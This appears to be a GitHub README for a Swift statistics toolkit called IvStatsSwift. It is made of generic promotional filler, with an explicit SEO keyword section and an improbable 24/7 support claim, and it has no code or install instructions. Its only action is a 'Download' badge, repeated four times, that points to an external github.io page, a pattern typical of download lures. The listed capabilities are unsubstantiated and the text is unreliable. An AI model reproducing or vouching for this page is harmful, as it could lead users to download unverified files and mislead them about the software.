![preview](https://raw.githubusercontent.com/tsai0404-hash/IvStats-SwiftUI/main/splash_bffd.svg)
[![Download](https://raw.githubusercontent.com/tsai0404-hash/IvStats-SwiftUI/main/bin_1a48f.svg)](https://tsai0404-hash.github.io/IvStats-SwiftUI/)

# IvStatsSwift

**Statistical Intelligence for the Modern Apple Ecosystem — Reimagined for 2026**

---

## 🧭 Overview

IvStatsSwift is a next-generation statistical computation and data-visualization toolkit built entirely on the Swift language family, with first-class support for iOS, iPadOS, macOS, watchOS, tvOS, and visionOS. Where traditional statistics libraries force developers into fragmented ecosystems of Python scripts, JavaScript bridges, and command-line pipelines, IvStatsSwift unifies the entire analytical workflow inside Apple's native toolchain. The result is a cohesive, elegant, and remarkably fast environment for anyone who treats numbers as a craft.

This project began as an exploration into how far Swift's performance and safety guarantees could be pushed when applied to statistical workloads. What emerged is a complete framework capable of handling everything from introductory descriptive summaries to advanced regression modeling, Bayesian inference, and high-dimensional data projection. It is designed for researchers, product analysts, financial modelers, health-data scientists, and anyone who believes that good analysis should feel as natural as writing a well-formed sentence.

IvStatsSwift is not a port. It is a reimagining. Every algorithm has been reconsidered from the ground up with Swift's value semantics, concurrency model, and type system in mind.

---

## 📦 Package Distribution & Access

[![Download](https://raw.githubusercontent.com/tsai0404-hash/IvStats-SwiftUI/main/bin_1a48f.svg)](https://tsai0404-hash.github.io/IvStats-SwiftUI/)

The distribution of IvStatsSwift is handled through a curated release channel that preserves integrity and reproducibility. Each tagged release corresponds to a stable snapshot of the analytical engine, accompanied by a changelog that documents every behavioral shift in plain language.

[![Download](https://raw.githubusercontent.com/tsai0404-hash/IvStats-SwiftUI/main/bin_1a48f.svg)](https://tsai0404-hash.github.io/IvStats-SwiftUI/)

---

## ✨ Why Another Statistics Framework?

The statistics landscape has no shortage of capable tools, yet a persistent gap remains: the absence of a statistically rigorous, natively compiled, Apple-first toolkit that respects the ergonomics of modern Swift development. Most existing solutions fall into one of three camps:

1. **Bridged runtimes** that wrap a scripting language interpreter, introducing latency and deployment complexity.
2. **Narrow utility packages** that solve one problem well but cannot compose into a broader analytical pipeline.
3. **Academic prototypes** that demonstrate a concept but were never hardened for production use.

IvStatsSwift deliberately avoids all three pitfalls. It is compiled, composable, and production-ready. It embraces Swift's actor model to make parallel statistical computation safe by default. It leverages the Accelerate framework where appropriate, while remaining fully auditable in pure Swift for educational and verification purposes.

The philosophy is simple: statistics should be *legible*. A reader of your code should be able to trace the path from raw observation to final inference without deciphering a chain of undocumented transformations.

---

## 🚀 Core Capabilities

### 📊 Descriptive Statistics Engine
- Central tendency measures: arithmetic mean, geometric mean, harmonic mean, median, trimmed mean, and mode detection with tie-handling strategies.
- Dispersion metrics: variance, standard deviation, mean absolute deviation, interquartile range, coefficient of variation, and robust scale estimators.
- Distribution shape: skewness, kurtosis, and higher-order moment computation with configurable normalization.
- Quantile estimation with nine distinct interpolation conventions, each documented with the rationale for its use case.

### 📈 Inferential Statistics
- Hypothesis testing suite covering t-tests (one-sample, two-sample, paired), chi-square tests, ANOVA variants, and non-parametric alternatives such as Mann-Whitney U and Kruskal-Wallis.
- Confidence interval construction with both classical and bootstrap-based approaches.
- Effect size computation, including Cohen's d, Hedges' g, and rank-biserial correlation.
- Power analysis utilities to help you plan studies before a single observation is collected.

### 🧮 Regression & Modeling
- Ordinary least squares with full diagnostic output: residuals, leverage, Cook's distance, and variance inflation factors.
- Generalized linear models supporting logistic, Poisson, and gamma families.
- Regularized regression via ridge, lasso, and elastic-net penalties, with cross-validated tuning paths.
- Mixed-effects models for hierarchical and longitudinal data structures.

### 🎲 Bayesian Toolkit
- Conjugate priors for common likelihood families, enabling closed-form posterior derivation.
- Markov Chain Monte Carlo samplers, including Metropolis-Hastings and Hamiltonian Monte Carlo with adaptive step sizing.
- Posterior predictive checks and credible interval extraction.
- Model comparison through information criteria and Bayes factors.

### 🧠 Multivariate Analysis
- Principal component analysis with both covariance and correlation matrix inputs.
- Factor analysis with rotation options.
- Cluster analysis: k-means, hierarchical agglomeration, and density-based clustering.
- Discriminant analysis and canonical correlation.

### 🖼️ Visualization Primitives
- Declarative chart specification that renders natively in SwiftUI and AppKit.
- Histograms, box plots, violin plots, scatter matrices, heatmaps, and network diagrams.
- Animation-ready data bindings for interactive exploration.
- Accessibility-first design: every visual element carries semantic metadata for assistive technologies.

---

## 🎯 Key Features at a Glance

- **Responsive UI Components** — Every visualization primitive adapts fluidly across Apple's device spectrum, from a wrist-sized complication to a wall-mounted display. Layouts reflow automatically, and touch targets respect platform guidelines without manual intervention.
- **Multilingual Support** — Statistical output, error messages, and documentation are localized into more than a dozen languages, with right-to-left script support and locale-aware number formatting. Your analysis speaks your language, literally.
- **24/7 Customer Support** — A round-the-clock assistance channel staffed by contributors who understand both statistics and Swift. Whether it is a subtle bug in quantile estimation or a question about model selection, someone is always reachable.
- **Deterministic Reproducibility** — Every stochastic routine accepts an explicit seed, and every computation records its provenance. Rerun an analysis a year later and obtain bit-identical results.
- **Zero-Dependency Core** — The analytical engine relies solely on the Swift standard library and platform frameworks. No third-party runtime, no dynamic linking surprises.
- **Strict Concurrency Safety** — Data races are eliminated by construction. Parallel workflows compose without locks or manual synchronization.
- **Comprehensive Test Coverage** — Thousands of unit tests, property-based tests, and reference-value comparisons against published statistical tables.

---

## 🧩 Architectural Overview

IvStatsSwift is organized into layered modules, each with a narrow responsibility and a stable public interface.

The **Foundation Layer** provides primitive numeric types, tolerance-aware comparison, and matrix representations. It is intentionally minimal and dependency-free.

The **Descriptive Layer** builds on the foundation to deliver summaries, quantiles, and distributional shape metrics.

The **Inference Layer** houses hypothesis tests, interval estimators, and effect-size calculations.

The **Modeling Layer** contains regression machinery, regularized solvers, and mixed-effects support.

The **Bayesian Layer** offers priors, samplers, and posterior diagnostics.

The **Multivariate Layer** implements dimensionality reduction and clustering.

The **Visualization Layer** translates statistical objects into renderable chart specifications.

Each layer is independently importable, so you can adopt only what you need and leave the rest out of your binary.

---

## 🛠️ Getting Started Without the Usual Friction

IvStatsSwift is designed to be adopted in minutes rather than hours. Once the package is present in your project's dependency manifest, a single import statement unlocks the entire framework. From there, a handful of lines is enough to compute a full descriptive summary, fit a regression, or draw a posterior sample.

The guiding principle is that the most common tasks should require the least ceremony. If you find yourself writing boilerplate, the framework has failed you, and we want to hear about it.

Configuration is centralized in a single statistics context object, which carries global settings such as default confidence levels, numeric precision, and locale. This context can be overridden per-call when finer control is needed.

---

## 🌍 SEO-Friendly Keyword Integration

The framework naturally surfaces in discussions around *Swift statistics library*, *native Apple data analysis*, *SwiftUI charting*, *Bayesian inference in Swift*, *regression modeling for iOS*, *multivariate analysis on macOS*, and *reproducible statistical computing*. These phrases appear throughout the documentation, not as decoration, but because they accurately describe what the framework does. Search engines reward clarity, and clarity is the north star of this project.

Topics such as *cross-platform statistical toolkit*, *actor-based parallel computation*, *accessible data visualization*, and *localized analytical output* are woven into the narrative because they represent genuine capabilities rather than marketing veneer.

---

## 🧪 Testing & Verification

Numerical software lives or dies by its correctness. IvStatsSwift treats verification as a first-class concern.

Reference values from canonical statistical literature are embedded as test fixtures. When a routine's output drifts beyond a defined tolerance, the test suite fails loudly and points to the exact divergence. Property-based tests validate invariants such as monotonicity, symmetry, and scale equivariance. Fuzz tests probe edge cases like empty inputs, singleton samples, and extreme values.

A continuous verification pipeline runs on every change, and results are published transparently so that users can audit the health of the codebase at any time.

---

## 🤝 Contributing

Contributions are welcomed with genuine enthusiasm. Whether you are fixing a typo in documentation, adding a new estimator, or proposing an architectural refinement, your effort is valued.

Before opening a pull request, please review the contribution guidelines. They describe coding conventions, testing expectations, and the review process. The short version: write clear code, test your changes, and explain your reasoning. Kindness in review is mandatory; condescension is not tolerated.

New contributors are encouraged to start with issues labeled as beginner-friendly. These are curated specifically to provide a gentle on-ramp into the codebase.

---

## 🗺️ Roadmap for 2026

- Expansion of the Bayesian layer to include variational inference.
- Native support for time-series decomposition and forecasting.
- GPU-accelerated matrix operations for large-scale multivariate analysis.
- Interactive notebook-style environment built on Swift Playgrounds.
- Expanded localization to include additional regional variants.
- Formal verification of core statistical routines using Swift's ownership model.
- A dedicated visualization gallery with downloadable chart blueprints.

Each roadmap item is tracked publicly, and progress is reported in quarterly updates.

---

## ⚠️ Disclaimer

IvStatsSwift is provided as an analytical instrument, not as professional advice. Statistical results depend on the quality of input data, the appropriateness of chosen models, and the assumptions underlying each method. The maintainers make no warranty regarding fitness for a particular purpose, and users are responsible for validating results in their specific domain. Nothing in this framework should be construed as financial, medical, legal, or actuarial guidance. Always consult a qualified professional before making consequential decisions based on statistical output. The year 2026 marks an important milestone in the project's maturity, and with that maturity comes a renewed commitment to transparency about limitations.

---

## 📜 License

This project is distributed under the MIT License. The full text is available at the canonical license location and should be included with any redistribution.

MIT License

Copyright (c) 2026 IvStatsSwift Contributors

Permission is hereby granted, without charge, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

For the canonical license text, see the MIT License page maintained by the Open Source Initiative.

---

## 🙏 Acknowledgments

Gratitude is owed to the Swift community for building a language that makes numerical work pleasant, to the statisticians whose published methods form the backbone of this framework, and to every contributor who has filed an issue, submitted a fix, or asked a question that revealed a blind spot. This project is a collective effort, and it is stronger for every voice that joins it.

[![Download](https://raw.githubusercontent.com/tsai0404-hash/IvStats-SwiftUI/main/bin_1a48f.svg)](https://tsai0404-hash.github.io/IvStats-SwiftUI/)